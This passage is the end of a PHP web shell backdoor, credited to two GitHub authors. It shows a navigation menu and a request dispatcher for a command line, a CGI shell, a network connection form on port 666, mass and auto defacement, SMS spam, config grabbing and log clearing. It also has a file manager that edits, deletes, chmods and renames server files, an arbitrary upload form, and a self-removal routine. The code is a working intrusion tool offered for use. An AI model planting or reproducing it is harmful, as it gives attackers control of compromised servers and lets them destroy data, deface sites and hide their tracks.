	<tr>
		<td align="center"><input type='text' class='input-sm' id='input' value='666' name='port'/></td>
	</tr>
	<tr>
		<td colspan="3">
			<center>
				<input type='submit' class='btn btn-danger' name='action' value='Open Connection'/>
			</center>
		</td>
	</tr>
</table>
</form>
	<?php
	die();
	}
}
function kill()
{
	clear_logs();
	unlink(getcwd() . $sep .$_SERVER['PHP_SELF']) ? alert("Backdoor removed") : alert("Permission Denied");
}
// END FUNCTION

?>
<nav class="navbar navbar-inverse">
	<div class="container-fluid">
		<div class="navbar-header">
			<a class="navbar-brand" href="?do=kill">Fuck Myself</a>
		</div>
		<ul class="nav navbar-nav">
			<li class="active"><a href="?">Home</a></li>
			<li class="dropdown"><a class="dropdown-toggle" data-toggle="dropdown" href="#">Tools <span class="caret"></span></a>
				<ul class="dropdown-menu">
					<li><a href='?do=cmd'><span class="glyphicon glyphicon-list-alt"></span> Command Line</a></li>
					<li><a href='?do=sms'><span class="glyphicon glyphicon-envelope"></span> Spam SMS</a></li>
					<li><a href='?do=music'><span class="glyphicon glyphicon-headphones"></span> Music</a></li>
					<li><a href='?do=jumping'><span class="glyphicon glyphicon-transfer"></span> Jumping</a></li>
					<li><a href='?do=config'><span class="glyphicon glyphicon-wrench"></span> Config</a></li>
					<li><a href='?do=mass_deface'><span class="glyphicon glyphicon-random"></span> Mass Deface</a></li>
					<li><a href='?do=info'><span class="glyphicon glyphicon-info-sign"></span> Server Info</a></li>
					<li><a href='?do=logs'><span class="glyphicon glyphicon-retweet"></span> Clear Logs</a></li>
					<li><a href='?do=cgi'><span class="glyphicon glyphicon-duplicate"></span> CGI Shell</a></li>
					<li><a href='?do=deface'><span class="glyphicon glyphicon-user"></span> Auto Deface</a></li>
					<li><a href='?do=shortlink'><span class="glyphicon glyphicon-link"></span> Shortlink Generator</a></li>
					<li><a href='?do=network'><span class="glyphicon glyphicon-globe"></span> Network</a></li>
				</ul>
			</li>
			<li><a href='?do=logout'><span class="glyphicon glyphicon-off"></span> Logout</a></li>
		</ul>
	</div>
</nav>
<?php
if(isset($_GET['do'])):
	if ($_GET['do'] == 'home') {
		home();
	}
	elseif ($_GET['do'] == 'sms') {
		spamsms();
	}
	elseif ($_GET['do'] == 'music') {
		music();
	}
	elseif ($_GET['do'] == 'jumping') {
		jumping();
	}
	elseif ($_GET['do'] == 'config') {
		config();
	}
	elseif ($_GET['do'] == 'mass_deface') {
		mass_deface_main();
	}
	elseif ($_GET['do'] == 'info') {
		info();
	}
	elseif ($_GET['do'] == 'logout') {
		logout();
	}
	elseif ($_GET['do'] == 'edit' and isset($_GET['files'])) {
		edit(base64_decode($_GET['files']));
	}
	elseif ($_GET['do'] == 'open' and isset($_GET['dir'])) {
		chdir(base64_decode($_GET['dir']));
	}
	elseif ($_GET['do'] == 'view' and isset($_GET['files'])) {
		view(base64_decode($_GET['files']));
	}
	elseif ($_GET['do'] == 'delete' and isset($_GET['files'])) {
		if (@hapus(base64_decode($_GET['files']))) {
			alert("Success");
		}
		else {
			alert("Permission Denied");
		}
	}
	elseif ($_GET['do'] == 'rename' and isset($_GET['files'])) {
		renames(base64_decode($_GET['files']));
	}
	elseif ($_GET['do'] == 'chmod' and isset($_GET['files'])) {
		chmods(base64_decode($_GET['files']));
	}
	elseif ($_GET['do'] == 'cmd') {
		cmd_ui();
	}
	elseif ($_GET['do'] == 'logs') {
		clear_logs();
	}
	elseif ($_GET['do'] == 'cgi') {
		cgi_shell();
	}
	elseif ($_GET['do'] == 'deface') {
		ngindex();
	}
	elseif ($_GET['do'] == 'shortlink') {
		short_link();
	}
	elseif ($_GET['do'] == 'new' and isset($_GET['dir'])) {
		newdir(base64_decode($_GET['dir']));
	}
	elseif($_GET['do'] == 'touch' and isset($_GET['files'])) {
		newfile(base64_decode($_GET['files']));
	}
	elseif ($_GET['do'] == 'network') {
		network();
	}
	elseif ($_GET['do'] == 'kill') {
		kill();
	}

endif;
echo "<table width='70%' cellpadding='3' cellspacing='3' align='center' style='background:green;'>
	<th style='background:green;float:left;width:200px;text-align:center;font-size:18px;'>Name</th>
	<th style='background:green;float:right;width:300px;text-align:center;font-size:18px;'>Action</th>
	</table>";
foreach (scandir(getcwd()) as $dir):
echo "<table width='70%' class='table-hover' align='center'>
		<tr>";
	$ext = pathinfo($dir, PATHINFO_EXTENSION);
	if (is_dir($dir)) {
		echo "<td><img src='https://cvar1984.github.io/Blank-Folder-icon.png' class='icon'>";
		echo "<a href='?do=open&dir=".base64_encode(getcwd().$sep.$dir)."'>$dir</a></td>";
		echo "<td style='float:right;margin-right:7px;'>
		<a class='btn btn-success btn-xs' href='?do=touch&files=".base64_encode(getcwd() . $sep . dirname($dir))."'>New File</a>
		<a class='btn btn-success btn-xs' href='?do=new&dir=".base64_encode(getcwd() . $sep . $dir)."'>New Dir</a>
		<a class='btn btn-success btn-xs' href='?do=chmod&files=" .base64_encode(getcwd() . $sep . $dir)."'>Chmod</a>
		<a class='btn btn-success btn-xs' href='?do=rename&files=" .base64_encode(getcwd() . $sep . $dir)."'>Rename</a> 
		<a class='btn btn-success btn-xs' href='?do=delete&files=" .base64_encode(getcwd() . $sep . $dir)."'>Delete</td>";
	}
	elseif ($ext == 'jpg' or $ext == 'jpeg') {
		echo "<td><img src='https://cvar1984.github.io/text-plain-icon.png' class='icon'>";
		echo "<a href='?do=view&files=".base64_encode(getcwd().$sep.$dir)."'>$dir</a></td>";
		echo "<td style='float:right;margin-right:7px;'>
		<a class='btn btn-success btn-xs' href='?do=touch&files=".base64_encode(getcwd() . $sep . dirname($dir))."'>New File</a>
		<a class='btn btn-success btn-xs' href='?do=new&dir=".base64_encode(getcwd() . $sep . dirname($dir))."'>New Dir</a>
		<a class='btn btn-success btn-xs' href='?do=chmod&files=" .base64_encode(getcwd() . $sep . $dir)."'>Chmod</a>
		<a class='btn btn-success btn-xs' href='?do=rename&files=" .base64_encode(getcwd() . $sep . $dir). "'>Rename</a> 
		<a class='btn btn-success btn-xs' href='?do=delete&files=" .base64_encode(getcwd() . $sep . $dir). "'>Delete</td>";
	}
	else {
		echo "<td><img src='https://cvar1984.github.io/text-plain-icon.png' class='icon'>";
		echo "<a href='?do=edit&files=".base64_encode(getcwd() . $sep . $dir) . "'>$dir</a></td>";
		echo "<td style='float:right;margin-right:7px;'>
		<a class='btn btn-success btn-xs' href='?do=touch&files=".base64_encode(getcwd() . $sep . dirname($dir)) . "'>New File</a>
		<a class='btn btn-success btn-xs' href='?do=new&dir=".base64_encode(getcwd() . $sep . dirname($dir))."'>New Dir</a>
		<a class='btn btn-success btn-xs' href='?do=chmod&files=".base64_encode(getcwd() . $sep . $dir)."'>Chmod</a>
		<a class='btn btn-success btn-xs' href='?do=rename&files=".base64_encode(getcwd() . $sep . $dir)."'>Rename</a> 
		<a class='btn btn-success btn-xs' href='?do=delete&files=".base64_encode(getcwd() . $sep . $dir)."'>Delete</td>";
	}
?>
	</tr>
	</table>
<?php endforeach;?>
<table width='70%' cellpadding='3' cellspacing='3' align='center'
		style='background: green;'>
		<th style='padding: 5px;' colspan='2'>
			<center>
			Copyright &copy <?php echo date("Y"); ?>, 
			<a href='https://github.com/Cvar1984'>Cvar1984</a> & <a href='https://github.com/l0lz666h05t'>L0LZ666H05T</a>
			</center>
		</th>
	</table>
	<?php
if (isset($_POST['upl'])) {
	if (copy($_FILES['file']['tmp_name'], getcwd() . $sep . $_FILES['file']['name'])) {
		alert("Upload Success");
	}
	else {
		alert("Upload Failed");
	}
}
?>
	<form method="post" enctype="multipart/form-data">
		<center>
			<input class="btn" type="file" name="file" />
			<input class="btn btn-danger" name="upl" type="submit" value="Save">
		</center>
	</form>
</body>
</html>
